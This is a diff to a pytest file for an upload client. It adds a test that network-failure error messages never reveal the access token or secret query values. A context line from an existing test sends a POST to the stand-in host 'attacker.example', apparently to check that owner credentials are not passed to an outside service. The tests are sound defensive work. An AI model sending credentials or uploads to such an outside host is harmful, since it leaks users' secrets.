@@ -171,6 +171,21 @@ def test_external_service_cannot_receive_owner_credentials(tmp_path):
         owner.request('POST', 'https://attacker.example/upload')
 
 
+@pytest.mark.parametrize('error,phase',[(upload.requests.ConnectTimeout,'connecting'),(upload.requests.ReadTimeout,'waiting for a reply'),(upload.requests.exceptions.SSLError,'TLS verification')])
+def test_network_failure_diagnostic_never_logs_credentials(tmp_path,error,phase):
+    from types import SimpleNamespace
+    owner=uploader(tmp_path);owner.auth_lock=threading.RLock()
+    owner.connection=SimpleNamespace(session={'authToken':{'accessToken':'private-token'}})
+    owner.headers=lambda:{}
+    def fail(*args,**kwargs):raise error('private-token in an unsafe exception URL')
+    owner.http=lambda:SimpleNamespace(request=fail)
+    with pytest.raises(upload.UploadError) as caught:
+        owner.request('POST','https://jaws-upload.jioaicloud.com/upload?secret=private-token')
+    text=str(caught.value)
+    assert 'jaws-upload.jioaicloud.com' in text and phase in text
+    assert 'private-token' not in text and 'secret=' not in text
+
+
 def test_changed_package_uses_immutable_name_and_resumes_same_version(tmp_path):
     owner=uploader(tmp_path);owner.workers=1
     identifier='pmx-example';package=tmp_path/(identifier+'.zip');package.write_bytes(b'new package')
